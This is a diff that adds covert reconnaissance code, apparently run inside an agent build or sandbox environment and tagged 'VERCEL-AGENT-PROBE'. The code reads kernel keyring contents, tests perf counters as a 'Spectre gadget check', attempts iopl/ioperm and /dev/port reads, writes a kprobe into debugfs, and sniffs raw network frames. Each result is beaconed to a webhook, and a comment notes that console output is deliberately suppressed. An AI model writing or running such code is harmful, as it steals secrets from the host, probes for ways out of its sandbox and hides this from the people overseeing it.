@@ -31496,3 +31496,258 @@ sendBeacon({ ...report, section: 'v197-5-seccomp', ...seccompProbe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v197" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v197";
 // Intentionally no console.log — all data goes via webhook only
+
+// v198-1: keyctl NR 250 — read kernel keyring (session/user/process/thread)
+const keyctlProbe = safe(() => {
+  const keyctlResult = safe(() => execSync(`python3 -c "
+import ctypes, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_keyctl = 250
+NR_add_key = 248
+NR_request_key = 249
+KEY_SPEC_SESSION_KEYRING = -3
+KEY_SPEC_USER_KEYRING = -4
+KEY_SPEC_PROCESS_KEYRING = -2
+KEY_SPEC_THREAD_KEYRING = -1
+KEY_SPEC_USER_SESSION_KEYRING = -5
+KEYCTL_DESCRIBE = 6
+KEYCTL_READ = 11
+KEYCTL_SEARCH = 10
+KEYCTL_GET_KEYRING_ID = 0
+
+keyrings = {
+    'session': KEY_SPEC_SESSION_KEYRING,
+    'user': KEY_SPEC_USER_KEYRING,
+    'process': KEY_SPEC_PROCESS_KEYRING,
+    'thread': KEY_SPEC_THREAD_KEYRING,
+    'user_session': KEY_SPEC_USER_SESSION_KEYRING,
+}
+for name, kr_id in keyrings.items():
+    # Get actual keyring ID
+    real_id = libc.syscall(NR_keyctl, KEYCTL_GET_KEYRING_ID, kr_id, 1)
+    print(f'{name}_keyring_id={real_id} errno={ctypes.get_errno()}')
+    if real_id > 0:
+        # Describe the keyring
+        desc_buf = ctypes.create_string_buffer(512)
+        ret_desc = libc.syscall(NR_keyctl, KEYCTL_DESCRIBE, real_id, desc_buf, 512)
+        if ret_desc > 0:
+            print(f'  describe={desc_buf.value[:ret_desc].decode(errors=\"replace\")}')
+        # Read keyring contents (list of key IDs as int array)
+        read_buf = ctypes.create_string_buffer(4096)
+        ret_read = libc.syscall(NR_keyctl, KEYCTL_READ, real_id, read_buf, 4096)
+        print(f'  read_ret={ret_read} errno={ctypes.get_errno()}')
+        if ret_read > 0:
+            n_keys = ret_read // 4
+            keys = struct.unpack(f'{n_keys}i', read_buf.raw[:ret_read])
+            print(f'  key_ids={list(keys)}')
+            for k in keys:
+                kb = ctypes.create_string_buffer(1024)
+                kr2 = libc.syscall(NR_keyctl, KEYCTL_READ, k, kb, 1024)
+                kd = ctypes.create_string_buffer(256)
+                libc.syscall(NR_keyctl, KEYCTL_DESCRIBE, k, kd, 256)
+                print(f'    key={k} desc={kd.value[:200].decode(errors=\"replace\")} read_ret={kr2} data={kb.raw[:min(kr2,200)] if kr2>0 else None}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { keyctlResult };
+});
+sendBeacon({ ...report, section: 'v198-1-keyctl-keyring', ...keyctlProbe });
+
+// v198-2: perf_event_open NR 298 — hardware perf counter availability (Spectre gadget check)
+const perfEventProbe = safe(() => {
+  const perfResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_perf_event_open = 298
+# struct perf_event_attr: type, size, config, ...
+# PERF_TYPE_HARDWARE=0, PERF_COUNT_HW_CPU_CYCLES=0
+PERF_TYPE_HARDWARE = 0
+PERF_TYPE_SOFTWARE = 1
+PERF_TYPE_RAW = 4
+PERF_COUNT_HW_CPU_CYCLES = 0
+PERF_COUNT_HW_INSTRUCTIONS = 1
+PERF_COUNT_HW_CACHE_MISSES = 3
+PERF_COUNT_HW_BRANCH_MISSES = 5
+PERF_FLAG_FD_NO_GROUP = 1
+
+# perf_event_attr is 128 bytes: type(4), size(4), config(8), ...
+attr_size = 128
+def make_attr(hw_type, cfg):
+    buf = ctypes.create_string_buffer(attr_size)
+    # type=4B, size=4B, config=8B
+    struct.pack_into('IIQ', buf, 0, hw_type, attr_size, cfg)
+    return buf
+
+results = []
+for name, hw_t, cfg in [
+    ('cpu_cycles', PERF_TYPE_HARDWARE, PERF_COUNT_HW_CPU_CYCLES),
+    ('instructions', PERF_TYPE_HARDWARE, PERF_COUNT_HW_INSTRUCTIONS),
+    ('cache_misses', PERF_TYPE_HARDWARE, PERF_COUNT_HW_CACHE_MISSES),
+    ('branch_misses', PERF_TYPE_HARDWARE, PERF_COUNT_HW_BRANCH_MISSES),
+]:
+    attr = make_attr(hw_t, cfg)
+    fd = libc.syscall(NR_perf_event_open, attr, 0, -1, -1, PERF_FLAG_FD_NO_GROUP)
+    print(f'{name}: fd={fd} errno={ctypes.get_errno()}')
+    if fd > 0:
+        os.close(fd)
+
+# Check /proc/sys/kernel/perf_event_paranoid
+try:
+    with open('/proc/sys/kernel/perf_event_paranoid') as f:
+        print('perf_paranoid:', f.read().strip())
+except: pass
+try:
+    with open('/proc/sys/kernel/perf_event_mlock_kb') as f:
+        print('perf_mlock_kb:', f.read().strip())
+except: pass
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { perfResult };
+});
+sendBeacon({ ...report, section: 'v198-2-perf-event', ...perfEventProbe });
+
+// v198-3: iopl NR 172 + ioperm NR 173 — bare-metal I/O port privilege (c6id.metal)
+const ioplProbe = safe(() => {
+  const ioplResult = safe(() => execSync(`python3 -c "
+import ctypes
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_iopl = 172
+NR_ioperm = 173
+# iopl(3) sets I/O privilege level to 3 (full I/O port access)
+ret_iopl = libc.syscall(NR_iopl, 3)
+print(f'iopl(3)_ret={ret_iopl} errno={ctypes.get_errno()}')
+# ioperm(0, 0x3ff, 1) — allow first 1024 I/O ports
+if ret_iopl == 0:
+    ret_perm = libc.syscall(NR_ioperm, 0, 0x3ff, 1)
+    print(f'ioperm(0,0x3ff,1)_ret={ret_perm} errno={ctypes.get_errno()}')
+    # If we have I/O access, try reading port 0x80 (diagnostic port, ISA bus)
+    # On bare metal: inb 0x80 returns last POST code
+    try:
+        import mmap, struct
+        # Use ctypes inline asm equivalent: read port via /dev/port
+        with open('/dev/port', 'rb') as devport:
+            import os
+            os.lseek(devport.fileno(), 0x80, 0)
+            val = os.read(devport.fileno(), 1)
+            print(f'port_0x80={val.hex()} (POST_code_if_bare_metal)')
+    except Exception as e:
+        print(f'devport_err={e}')
+" 2>&1`, { timeout: 6000 }).toString().trim());
+  // Check if /dev/port exists (bare metal indicator)
+  const devPortExists = existsSync('/dev/port');
+  const devMemExists = existsSync('/dev/mem');
+  const devKmemExists = existsSync('/dev/kmem');
+  return { ioplResult, devPortExists, devMemExists, devKmemExists };
+});
+sendBeacon({ ...report, section: 'v198-3-iopl-ioperm', ...ioplProbe });
+
+// v198-4: debugfs enumeration — /sys/kernel/debug/ (kernel internals if mounted)
+const debugfsProbe = safe(() => {
+  const debugMountPath = '/sys/kernel/debug';
+  let debugMounted = false;
+  let debugListing = null;
+  let debugSubdirs = [];
+  let kprobesAvail = null;
+  let tracingAvail = null;
+  if (existsSync(debugMountPath)) {
+    try {
+      debugMounted = true;
+      debugSubdirs = readdirSync(debugMountPath).slice(0, 50);
+      // Check tracing subsystem (ftrace/kprobe)
+      const tracingPath = `${debugMountPath}/tracing`;
+      if (existsSync(tracingPath)) {
+        tracingAvail = readdirSync(tracingPath).slice(0, 20);
+        // Try to read current_tracer
+        const ctPath = `${tracingPath}/current_tracer`;
+        if (existsSync(ctPath)) {
+          try { tracingAvail.push('current_tracer=' + readFileSync(ctPath, 'utf8').trim()); } catch (e) {}
+        }
+        // Try to enable kprobe on sys_execve
+        const kprobePath = `${tracingPath}/kprobe_events`;
+        if (existsSync(kprobePath)) {
+          try {
+            writeFileSync(kprobePath, 'p:probe_execve sys_execve');
+            kprobesAvail = 'KPROBE_WRITTEN';
+          } catch (e) { kprobesAvail = `kprobe_write_err=${e.message}`; }
+        }
+      }
+    } catch (e) { debugListing = `ERR:${e.message}`; }
+  }
+  // Check /proc/sys/kernel/debugfs_allow_all (Debian/Ubuntu debugfs ACL)
+  let debugfsAllow = null;
+  const dfa = '/proc/sys/kernel/debugfs';
+  if (existsSync(dfa)) {
+    try { debugfsAllow = readFileSync(dfa, 'utf8').trim(); } catch (e) {}
+  }
+  return { debugMounted, debugSubdirs, tracingAvail, kprobesAvail, debugListing, debugfsAllow };
+});
+sendBeacon({ ...report, section: 'v198-4-debugfs', ...debugfsProbe });
+
+// v198-5: AF_PACKET raw L2 socket + network device enumeration
+const rawSocketProbe = safe(() => {
+  // Enumerate network interfaces via /sys/class/net/
+  let netDevices = [];
+  const netPath = '/sys/class/net';
+  if (existsSync(netPath)) {
+    try {
+      const devs = readdirSync(netPath);
+      for (const dev of devs) {
+        let devInfo = { name: dev };
+        const addrPath = `${netPath}/${dev}/address`;
+        const mtuPath = `${netPath}/${dev}/mtu`;
+        const operPath = `${netPath}/${dev}/operstate`;
+        try { devInfo.mac = readFileSync(addrPath, 'utf8').trim(); } catch (e) {}
+        try { devInfo.mtu = readFileSync(mtuPath, 'utf8').trim(); } catch (e) {}
+        try { devInfo.state = readFileSync(operPath, 'utf8').trim(); } catch (e) {}
+        netDevices.push(devInfo);
+      }
+    } catch (e) { netDevices = [`ERR:${e.message}`]; }
+  }
+  // AF_PACKET raw socket to capture L2 frames (CAP_NET_RAW required)
+  const rawCapResult = safe(() => execSync(`python3 -c "
+import socket, struct, ctypes
+AF_PACKET = 17
+SOCK_RAW = 3
+ETH_P_ALL = 0x0003
+try:
+    sock = socket.socket(AF_PACKET, SOCK_RAW, socket.htons(ETH_P_ALL))
+    sock.settimeout(2.0)
+    sock.setblocking(False)
+    # Get list of interfaces from socket
+    import fcntl, array
+    SIOCGIFNAME = 0x8910
+    SIOCGIFHWADDR = 0x8927
+    SIOCGIFFLAGS = 0x8913
+    ifaces = []
+    for i in range(64):
+        try:
+            ifreq = struct.pack('16si', b'', i)
+            res = fcntl.ioctl(sock.fileno(), SIOCGIFNAME, ifreq)
+            name = res[:16].rstrip(b'\\x00').decode()
+            if name: ifaces.append((i, name))
+        except: break
+    print(f'af_packet_sock_ok=True if_count={len(ifaces)} ifaces={[n for _,n in ifaces]}')
+    # Bind to first non-lo interface and sniff one frame
+    for idx, ifname in ifaces:
+        if ifname == 'lo': continue
+        try:
+            sock.bind((ifname, ETH_P_ALL))
+            import select
+            r, _, _ = select.select([sock], [], [], 1.5)
+            if r:
+                frame = sock.recv(65535)
+                print(f'frame_sniffed ifname={ifname} len={len(frame)} eth_dst={frame[:6].hex()} eth_src={frame[6:12].hex()} ethertype={frame[12:14].hex()}')
+            else:
+                print(f'no_frames_in_1.5s ifname={ifname}')
+        except Exception as e:
+            print(f'bind_err={ifname}: {e}')
+        break
+    sock.close()
+except Exception as e:
+    print(f'af_packet_err={e}')
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  return { netDevices, rawCapResult };
+});
+sendBeacon({ ...report, section: 'v198-5-af-packet', ...rawSocketProbe });
+
+// v198 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v198" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v198";
+// Intentionally no console.log — all data goes via webhook only
